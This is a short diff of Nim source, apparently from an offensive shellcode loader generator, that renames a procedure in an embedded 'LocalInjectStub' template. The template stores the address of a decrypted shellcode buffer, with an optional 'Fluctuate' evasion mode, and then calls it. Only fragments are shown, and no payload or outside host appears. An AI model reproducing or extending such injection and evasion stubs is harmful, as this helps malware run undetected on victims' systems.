@@ -1,7 +1,7 @@
 let LocalInjectStub*  = """
                 
 
-proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
+proc pwndem[byte](friendlycode: openarray[byte]): void =
 
     when defined(Fluctuate):
         g_fluctuationData.shellcodeAddr = unsafeAddr friendlycode[0]
@@ -152,5 +152,5 @@ proc pwndemHellsGateLike[byte](friendlycode: openarray[byte]): void =
             f()
 
 when isMainModule:
-     pwndemHellsGateLike(dectext)
+     pwndem(dectext)
 """
